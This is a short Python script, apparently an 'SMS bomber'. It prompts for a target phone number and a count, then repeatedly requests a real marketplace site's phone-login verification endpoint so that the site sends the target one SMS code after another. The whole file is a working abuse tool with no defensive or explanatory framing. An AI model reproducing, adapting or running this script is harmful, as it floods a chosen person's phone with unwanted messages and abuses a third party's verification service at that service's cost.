


import requests
Number=input(" EnterTerget Number: ")
Amount=int(input("Enter your Amount"))
sent=0
while sent<Amount:


    a=requests.get("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+Number)

    if a.status_code==200:
        sent+=1
        print(f"{sent}. sms sent")
    else:
        pass   
   # print(a.text)
   # print(a.status_code)